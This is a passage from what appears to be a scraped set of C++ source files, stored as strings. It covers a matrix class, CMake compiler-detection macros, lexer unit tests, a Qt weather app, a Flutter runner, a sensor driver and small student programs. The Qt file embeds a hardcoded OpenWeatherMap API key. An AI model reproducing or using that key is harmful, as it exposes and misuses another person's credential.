matrix::operator*(float scalar) {\n\tmatrix newMatrix(this->columnCount, this->rowCount);\n\tfor (int column = 0; column < this->columnCount; column++) {\n\t\tfor (int row = 0; row < this->rowCount; row++) {\n\t\t\tnewMatrix.data[row][column] = this->data[row][column] * scalar;\n\t\t}\n\t}\n\treturn newMatrix;\n}\n\nstd::vector<float>& matrix::operator[](int index) {\n\tif (index < this->rowCount) {\n\t\treturn this->data[index];\n\t}\n\telse {\n\t\tstd::cout << this->rowCount << \" \" << index << \" out of bound\\n\";\n\t\t//throw std::invalid_argument(\"Index out of bound\");\n\t}\n}\n\n//data[row][column]\nmatrix matrix::operator*(matrix m2) {\n\tif ((*this).columnCount == m2.rowCount) {\n\t\tmatrix newMatrix(this->rowCount, m2.columnCount);\n\n\t\tfor (int row1 = 0; row1 < newMatrix.rowCount; ++row1) {\n\t\t\t\n\t\t\tstd::vector<std::thread> threads;\n\n\t\t\tfor (int column1 = 0; column1 < newMatrix.columnCount; ++column1) {\n\t\t\t\tfloat sum = 0;\n\t\t\t\t\n\t\t\t\tfor (int sumIndex = 0; sumIndex < this->columnCount; ++sumIndex) {\n\t\t\t\t\tsum += (*this)[row1][sumIndex] * m2[sumIndex][column1]; // second one is vertically indexed\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tnewMatrix[row1][column1] = sum;\n\t\t\t}\n\n\t\t}\n\n\t\treturn newMatrix;\n\t}\n\telse {\n\t\tthrow std::invalid_argument(\"Mismatch dimension\");\n\t}\n}\n\nstd::ostream& operator<<(std::ostream& os, const matrix& ma) {\n\tfor (int columns = 0; columns < ma.data.size(); columns++) {\n\t\tfor (int row = 0; row < ma.data[columns].size(); row++) {\n\t\t\tos << ma.data[columns][row] << \" \";\n\t\t}\n\t\tos << \"\\n\";\n\t}\n\n\treturn os;\n}",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include \"Lexer.h\"\n#include <gtest/gtest.h>\n\nusing Lox::TokenType;\n\nstatic void assert_tokens(std::string_view source,\n                          std::vector<Lox::Token> tokens,\n                          std::string_view error_span = {})\n{\n    Lox::Lexer lexer(source);\n    auto output = lexer.lex();\n    ASSERT_EQ(output.size(), tokens.size());\n    for (std::size_t i = 0; i < output.size(); ++i) {\n        const auto& lhs = output[i];\n        const auto& rhs = tokens[i];\n        EXPECT_EQ(lhs.type(), rhs.type());\n        EXPECT_EQ(lhs.text(), rhs.text());\n        EXPECT_EQ(lhs.value(), rhs.value());\n    }\n\n    if (error_span.empty())\n        EXPECT_FALSE(lexer.has_errors());\n    else {\n        auto& errs = lexer.errors();\n        ASSERT_EQ(errs.size(), 1);\n        EXPECT_EQ(errs[0].source, source);\n        EXPECT_EQ(errs[0].span, error_span);\n    }\n}\n\nstatic void assert_token(std::string_view source, TokenType type,\n                         Lox::Token::ValueType value = Lox::Token::DefaultValueType())\n{\n    assert_tokens(source, { { type, source, std::move(value) } });\n}\n\nstatic void assert_error(std::string_view source, std::string_view error_span = {})\n{\n    if (error_span.empty())\n        error_span = source;\n    assert_tokens(source, {}, error_span);\n}\n\nTEST(Lexer, EmptySourceReturnsNoTokens)\n{\n    assert_tokens(\"\", {});\n}\n\nTEST(Lexer, OneCharTokens)\n{\n    assert_token(\"(\", TokenType::LeftParen);\n    assert_token(\")\", TokenType::RightParen);\n    assert_token(\"{\", TokenType::LeftBrace);\n    assert_token(\"}\", TokenType::RightBrace);\n    assert_token(\",\", TokenType::Comma);\n    assert_token(\".\", TokenType::Dot);\n    assert_token(\"-\", TokenType::Minus);\n    assert_token(\"+\", TokenType::Plus);\n    assert_token(\";\", TokenType::Semicolon);\n    assert_token(\"*\", TokenType::Star);\n    assert_token(\"/\", TokenType::Slash);\n    assert_token(\"%\", TokenType::Percent);\n\n    assert_error(\"@\");\n}\n\nTEST(Lexer, SkipWhitespace)\n{\n    assert_tokens(\"\\t(\\n)\\r\\n{  }\\t\\t\", {\n        { TokenType::LeftParen, \"(\" },\n        { TokenType::RightParen, \")\" },\n        { TokenType::LeftBrace, \"{\" },\n        { TokenType::RightBrace, \"}\" },\n    });\n}\n\nTEST(Lexer, OneTwoCharTokens)\n{\n    assert_token(\"!\", TokenType::Bang);\n    assert_token(\"!=\", TokenType::BangEqual);\n    assert_token(\"=\", TokenType::Equal);\n    assert_token(\"==\", TokenType::EqualEqual);\n    assert_token(\">\", TokenType::Greater);\n    assert_token(\">=\", TokenType::GreaterEqual);\n    assert_token(\"<\", TokenType::Less);\n    assert_token(\"<=\", TokenType::LessEqual);\n}\n\nTEST(Lexer, Identifiers)\n{\n    assert_token(\"_\", TokenType::Identifier);\n    assert_token(\"x0\", TokenType::Identifier);\n    assert_token(\"foo_bar\", TokenType::Identifier);\n    assert_token(\"FOOBAR\", TokenType::Identifier);\n    assert_token(\"__foo3__BAR4__\", TokenType::Identifier);\n}\n\nTEST(Lexer, Strings)\n{\n    assert_token(R\"(\"\")\", TokenType::String, \"\");\n    assert_token(R\"(\"hello world!\")\", TokenType::String, \"hello world!\");\n    assert_token(R\"(\"\\t\\r\\n\\\"\\\\\")\", TokenType::String, \"\\t\\r\\n\\\"\\\\\");\n    assert_token(R\"(\"multi\n        line\n        string\")\", TokenType::String, \"multi\\n\\\n        line\\n\\\n        string\");\n    assert_token(R\"(\"newline \\\nescape\")\", TokenType::String, \"newline escape\");\n\n    assert_error(R\"(\"foo\\z\")\", \"\\\\z\");\n    assert_error(R\"(\"unterminated string)\");\n}\n\nTEST(Lexer, Numbers)\n{\n    assert_token(\"9007199254740991\", TokenType::Number, 9007199254740991.0);\n    assert_token(\"3.14159265\", TokenType::Number, 3.14159265);\n    assert_token(\"4e9\", TokenType::Number, 4e9);\n    assert_token(\"7.843e-9\", TokenType::Number, 7.843e-9);\n\n    assert_error(\"1e999999\");\n}\n\nTEST(Lexer, Keywords)\n{\n    assert_token(\"and\", TokenType::And);\n    assert_token(\"break\", TokenType::Break);\n    assert_token(\"class\", TokenType::Class);\n    assert_token(\"continue\", TokenType::Continue);\n    assert_token(\"else\", TokenType::Else);\n    assert_token(\"false\", TokenType::False, false);\n    assert_token(\"fn\", TokenType::Fn);\n    assert_token(\"for\", TokenType::For);\n    assert_token(\"if\", TokenType::If);\n    assert_token(\"in\", TokenType::In);\n    assert_token(\"nil\", TokenType::Nil);\n    assert_token(\"or\", TokenType::Or);\n    assert_token(\"print\", TokenType::Print);\n    assert_token(\"return\", TokenType::Return);\n    assert_token(\"super\", TokenType::Super);\n    assert_token(\"this\", TokenType::This);\n    assert_token(\"true\", TokenType::True, true);\n    assert_token(\"var\", TokenType::Var);\n    assert_token(\"while\", TokenType::While);\n}\n\nTEST(Lexer, Comments)\n{\n    assert_tokens(R\"(// commented line\n        f(); // comment after code)\", {\n        { TokenType::Comment, \"// commented line\" },\n        { TokenType::Identifier, \"f\" },\n        { TokenType::LeftParen, \"(\" },\n        { TokenType::RightParen, \")\" },\n        { TokenType::Semicolon, \";\" },\n        { TokenType::Comment, \"// comment after code\" },\n    });\n}\n\nTEST(Lexer, MultipleTokens)\n{\n    assert_tokens(R\"(\n        var foo = bar * 3.14;\n        print(foo, \"\\tbaz\");)\", {\n     ",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n#include <QNetworkAccessManager>\n#include <QNetworkReply>\n#include <QJsonDocument>\n#include <QJsonObject>\n#include <QUrl>\n#include <QJsonArray>\n#include <QTimer>\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n    connect(manager, SIGNAL(finished(QNetworkReply*)), this, SLOT(onGetTemp(QNetworkReply*)));\n\n}\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n\nvoid MainWindow::onGetTemp(QNetworkReply* reply){\n\n        if(reply->error() == QNetworkReply::NoError){\n\n                connected = true;\n                QByteArray responseBytes = reply->readAll();\n                QJsonDocument jsonResponse = QJsonDocument::fromJson(responseBytes);\n                QJsonObject jsonObject = jsonResponse.object();\n                double temperature = jsonObject[\"main\"].toObject()[\"temp\"].toDouble();\n                QString weatherDescription = jsonObject[\"weather\"].toArray()[0].toObject()[\"description\"].toString();\n                QString city = jsonObject[\"name\"].toString();\n                qDebug() << city;\n                disconnect(timer, SIGNAL(timeout()), this, SLOT(countMill()));\n                emit sendResponse(temperature, weatherDescription, city, mill);\n                mill = 0;\n                return;\n    }\n    qDebug()<< \"the connection Faill\";\n    connected = false;\n    disconnect(timer, SIGNAL(timeout()), this, SLOT(countMill()));\n    mill = 0;\n\n}\n\n\nvoid MainWindow::on_pushButton_clicked()\n{\n    QString API_KEY = \"d86807edf6e968011a12cc2e243cad5c\";\n    QString city = ui->lineEdit->text();\n    QUrl url(\"http://api.openweathermap.org/data/2.5/weather?q=\" + city + \"&appid=\" + API_KEY + \"&units=metric\");\n    manager->get(QNetworkRequest(url));\n    connect(timer, SIGNAL(timeout()), this, SLOT(countMill()));\n    timer->start(100);\n}\n\nvoid MainWindow::countMill(){\n\n    mill++;\n    qDebug()<< mill;\n\n}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
    "#include <iostream>;\n#include <string>;\n#include \"BoardManager.h\";\n\nBoardManager board;\nbool playing = true;\nbool xMove = true;\nbool winner = false;\n\nint col;\nint row;\n\nint main()\n{\n    std::cout << \"Welcome\" << std::endl << \"Player 1 will be X, and Player 2 will be O\" << std::endl;\n    std::cout << \"To make your move, please enter the row (1-3) and the column (1-3) where you would like to make your move with a space in between\" << std::endl;\n\n    while (playing)\n    {\n        bool isValidMove = false;\n\n       board.PrintBoard();\n\n       std::cout << (xMove ? \"Player 1\" : \"Player2\") << \", please make your move\" << std::endl;\n       std::cin >> row >> col;\n\n       if (!board.CheckValidMove(row, col))\n       {\n           while (isValidMove == false)\n           {\n               std::cout << \"Invalid move, please make a new move\" << std::endl;\n               std::cin >> row >> col;\n               isValidMove = board.CheckValidMove(row, col);\n           }\n       }\n       else\n       {\n           isValidMove = true;\n       }\n\n       if (xMove)\n       {   \n           board.MakeMove(\"X\", row, col);\n       }\n       else\n       {\n           board.MakeMove(\"O\", row, col);\n       }\n\n       if (board.CheckForWin((xMove ? \"X\" : \"O\"), row, col))\n       {\n           playing = false;\n       }\n\n       xMove = !xMove;\n\n    }\n\n    board.PrintBoard();\n    std::cout << \"Congratulations \" << (!xMove ? \"Player 1\" : \"Player 2\") << \" has won!\";\n\n    return 0;\n}",
    "#include <iostream>\nusing namespace std;\n\nstring low(string c){\n    string temp = c;\n    for(int i=0; i<temp.size(); i++){\n        if('A'<=temp[i] && temp[i]<= 'Z'){\n            temp[i]+= 32;\n        }\n    }\n    return temp;\n}\n\nint sum(int arr[], int t){\n    int temp =0;\n   for(int i=0; i<t; i++){\n        temp+=arr[i];\n    }\n    return temp;\n}\n\nvoid printAverage(int arr[],int t){\n    float temp =0;\n    for(int i =0; i<t; i++){\n        temp += arr[i];\n    }\n    if(t !=0) {\n        temp = temp / t;\n        cout << \"\\t\" << \"Average: \" << temp << endl;\n    } else {\n        cout << \"1\uac1c \uc774\uc0c1\uc758 \uc810\uc218\uac00 \uc785\ub825\ub418\uc5b4\uc57c \ud55c\ub2e4\" << endl;\n    }\n}\nvoid printList(int arr[],int t){\n    if (t>1){\n        for(int i=0;i<t-1 ;i++){\n            cout <<\"\\t\" << arr[i] << \",\";\n        }\n        cout << arr[t-1] << endl;\n    }\n    else if(t==1){\n        cout << arr[t-1] << endl;\n    }\n    else{\n        cout << endl;\n    }\n}\n\nint main() {\n    cout<< \"Enter the score count: \";\n    int maxSize, score, k=0;\n    float avg;\n    string command;\n    cin >> maxSize;\n    int* const scores = new int[maxSize];\n    cout << \"Enter command: (add, sum,average, list, quit) \";\n    cin >> command;\n    command = low(command);\n    while(command != \"quit\"){\n        if(command == \"add\"){\n            if(k<maxSize){\n                cout<< \"Enter score: \";\n                cin >> score;\n                if(score >=0 && score <= 100){\n                    cout<<\"\\t\" << score << \" added\"<<endl;\n                    scores[k] = score;\n                    k++;\n                }\n                else{\n                    cout << \"\\t\" << \"Score should be between 0 and 100\"<< endl;\n                }\n            }\n            else{\n                cout<< \"Too many scores\"<<endl;\n            }\n        }\n        else if(command == \"sum\"){\n            cout<<\"\\t\" <<\"Sum: \"<< sum(scores,k) << endl;\n        }\n        else if(command == \"average\"){\n            printAverage(scores,k);\n        }\n        else if(command == \"list\"){\n            printList(scores,k);\n        }\n        cout << \"Enter command: (add, sum,average, list, quit) \";\n        cin >> command;\n        command = low(command);\n    }\n    cout<<\"Bye\";\n    delete [] scores;\n}\n",
    "#include <iostream>\n#include <cstdlib> \nusing namespace std;\n\nvoid multipli(int num) {\n\tcout << \"M\u00faltiplos de \" << num << \": \";\n\tfor (int wirii = 1; wirii <= 10000; ++wirii) {\n\t\tif (wirii % num == 0) {\n\t\t\tcout << wirii << \" \";\n\t\t}\n\t}\n\tcout << endl;\n}\n\nvoid fact(int num) {\n\tint fact = 1;\n\tfor (int wiro = 1; wiro <= num; ++wiro) {\n\t\tfact *= wiro;\n\t}\n\tcout << \"Factorial \" << num << \": \" << fact << endl;\n}\n\nvoid Fibo(int num) {\n\tint a = 0, b = 1, c;\n\tcout << \"Serie de Fibonacci \" << num << \":\" << endl;\n\tcout << a << \" \" << b << \" \";\n\t\n\tfor (int wiro = 2; wiro < num; ++wiro) {\n\t\tc = a + b;\n\t\tcout << c << \" \";\n\t\ta = b;\n\t\tb = c;\n\t}\n\tcout << endl;\n}\n\nvoid mostrarMensaje() {\n\tcout << \"Ingresa primer n\u00famero: \";\n}\n\nvoid mostrarMensaje2() {\n\tcout << \"Seleccione una acci\u00f3n:\" << endl;\n\tcout << \"1. Encontrar m\u00faltiplos del n\u00famero.\" << endl;\n\tcout << \"2. Calcular el factorial del n\u00famero.\" << endl;\n\tcout << \"3. Calcular la serie de Fibonacci del n\u00famero.\" << endl;\n}\n\nint main(int argc, char *argv[]) {\n\tint num, acc;\n\tint control = 1;\n\tdo {\n\t\tmostrarMensaje();\n\t\tcin >> num;\n\t\tmostrarMensaje2();\n\t\tcin >> acc;\n\t\t\n\t\tswitch (acc) {\n\t\tcase 1:\n\t\t\tmultipli(num);\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tfact(num);\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tFibo(num);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tcout << \"Opci\u00f3n no aceptada.\" << endl;\n\t\t\tbreak;\n\t\t}\n\t} while (control);\n\t\n\treturn 0;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"proyecto_grado_editor_codigo\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*!\n * @file DFRobet_ColorTemperature.cpp\n * @brief This is the implementation file for DFRobet_ColorTemperature\n * @copyright   Copyright (c) 2010 DFRobot Co.Ltd (http://www.dfrobot.com)\n * @license     The MIT License (MIT)\n * @author [TangJie](jie.tang@dfrobot.com)\n * @version  V1.0\n * @date  2024-04-01\n * @url https://github.com/DFRobot/DFRobet_ColorTemperature\n */\n\n#include \"DFRobet_ColorTemperature.h\"\n\nDFRobet_ColorTemperature::DFRobet_ColorTemperature(TwoWire *pWire)\n{\n  _pWire = pWire;\n  _addr = COLORTEMPERATURE_ADDR;\n};\n\nDFRobet_ColorTemperature::DFRobet_ColorTemperature(Stream *s):DFRobot_RTU(s)\n{\n  _s = s;\n  _addr = COLORTEMPERATURE_ADDR;\n};\n\nint8_t DFRobet_ColorTemperature::begin(void)\n{\n  delay(500);\n  setTimeoutTimeMs(200);\n  \n  if(_addr > 0xF7){\n    DBG(\"Invaild Device addr.\");\n  }\n  if(_addr != 0){\n    if(!detectDeviceAddress(_addr)){\n      DBG(\"Device addr Error.\");\n      return -1;\n    }\n  }else{\n    return -1;\n  }\n  return 0;\n}\n\nuint16_t DFRobet_ColorTemperature::readLUX(void)\n{\n  uint16_t data = 0;\n  uint8_t buffer[4];\n  readReg(COLORTEMPERATURE_LUX_REG,buffer,2);\n  if(_pWire){\n    data = buffer[1] << 8 | buffer[0];\n  }else{\n    data = buffer[0] << 8 | buffer[1];\n  }\n  \n  return data;\n}\n\nuint16_t DFRobet_ColorTemperature::readCCT(void)\n{\n  uint16_t data = 0;\n  uint8_t buffer[4];\n  readReg(COLORTEMPERATURE_CCT_REG,buffer,2);\n  if(_pWire){\n    data = buffer[1] << 8 | buffer[0];\n  }else{\n    data = buffer[0] << 8 | buffer[1];\n  }\n  return data;\n}\n\nfloat DFRobet_ColorTemperature::readX(void)\n{\n  float data = 0;\n  uint8_t buffer[4];\n  readReg(COLORTEMPERATURE_X_REG,buffer,2);\n  if(_pWire){\n    data = (float)(buffer[1] << 8 | buffer[0]) / 10000;\n  }else{\n    data = (float)(buffer[0] << 8 | buffer[1]) / 10000;\n  }\n  \n  return data;\n}\n\nfloat DFRobet_ColorTemperature::readY(void)\n{\n  float data = 0;\n  uint8_t buffer[4];\n  readReg(COLORTEMPERATURE_Y_REG,buffer,2);\n  if(_pWire){\n    data = (float)(buffer[1] << 8 | buffer[0]) / 10000;\n  }else{\n    data = (float)(buffer[0] << 8 | buffer[1]) / 10000;\n  }\n  return data;\n}\n\nbool  DFRobet_ColorTemperature::detectDeviceAddress(uint8_t addr)\n{\nuint8_t buf[2];\n  if(_pWire){\n  _pWire->begin();\n  }\n  readReg(COLORTEMPERATURE_ADDR_REG, buf, 2);\n  DBG((buf[0] << 8| buf[1]));\n  if(_pWire){\n    if(addr == ((buf[1] << 8| buf[0]) & 0xFF))\n    return true;\n  }else{\n    if(addr == ((buf[0] << 8| buf[1]) & 0xFF))\n    return true;\n  }\n  return false;\n}\n\nuint8_t DFRobet_ColorTemperature::readReg(uint16_t reg, void *pBuf, uint8_t size)\n{\n  uint8_t* _pBuf = (uint8_t*)pBuf;\n  \n    if(pBuf == NULL){\n      DBG(\"data error\");\n      return 0;\n    }\n  if(_pWire){\n    uint8_t _reg = reg;\n    _pWire->begin();\n    _pWire->beginTransmission(_addr);\n    _pWire->write(_reg);\n    _pWire->endTransmission();\n    _pWire->requestFrom(_addr, size);\n    for(uint8_t i = 0; i < size; i++)\n      _pBuf[i] = _pWire->read();\n    \n    return size;\n  }else{\n    return readInputRegister(_addr, reg, _pBuf, size);\n  }\n}\n\n// uint8_t DFRobet_ColorTemperature::writeReg(uint8_t reg, void *pBuf, size_t size)\n// {\n//   uint8_t *_pBuf = (uint8_t*)pBuf;\n\n//   uint8_t ret = 0;\n//   if(_pWire){\n//     uint8_t _reg = reg+5;\n//     _pWire->beginTransmission(_addr);\n//     _pWire->write(_reg);\n//     for(uint8_t i = 0; i < size;){\n//       uint8_t temp = _pBuf[i];\n//       _pBuf[i] = _pBuf[i+1];\n//       _pBuf[i+1] = temp;\n//       i+=2;\n//     }\n//     for(size_t i = 0; i < size; i++){\n//       _pWire->write(_pBuf[i]);\n//     }\n//     _pWire->endTransmission();\n//   }else{\n//     ret = writeHoldingRegister(_addr,reg,_pBuf,size);\n//   }\n//   return ret;\n// }",
    "#include <iostream>\r\nusing namespace std;\r\n\r\n/// PROGRAM SINGLE LINKED LIST NON-CIRCULAR\r\n// Deklarasi Struct Node\r\nstruct Node\r\n{\r\n    // komponen/member\r\n    int data;\r\n    string kata;\r\n    Node *next;\r\n};\r\nNode *head;\r\nNode *tail;\r\n\r\n// Inisialisasi Node\r\nvoid init()\r\n{\r\n    head = NULL;\r\n    tail = NULL;\r\n}\r\n\r\n// Pengecekan\r\nbool isEmpty()\r\n{\r\n    if (head == NULL)\r\n        return true;\r\n    else\r\n        return false;\r\n}\r\n\r\n// Tambah Depan\r\nvoid insertDepan(int nilai, string kata)\r\n{\r\n    // Buat Node baru\r\n    Node *baru = new Node;\r\n    baru->data = nilai;\r\n    baru->kata = kata;\r\n    baru->next = NULL;\r\n    if (isEmpty() == true)\r\n    {\r\n        head = tail = baru;\r\n        tail->next = NULL;\r\n    }\r\n    else\r\n    {\r\n        baru->next = head;\r\n        head = baru;\r\n    }\r\n}\r\n\r\n// Tambah Belakang\r\nvoid insertBelakang(int nilai, string kata)\r\n{\r\n    // Buat Node baru\r\n    Node *baru = new Node;\r\n    baru->data = nilai;\r\n    baru->kata = kata;\r\n    baru->next = NULL;\r\n    if (isEmpty() == true)\r\n    {\r\n        head = tail = baru;\r\n        tail->next = NULL;\r\n    }\r\n    else\r\n    {\r\n        tail->next = baru;\r\n        tail = baru;\r\n    }\r\n}\r\n// Hitung Jumlah List\r\nint hitungList()\r\n{\r\n    Node *hitung;\r\n    hitung = head;\r\n    int jumlah = 0;\r\n    while 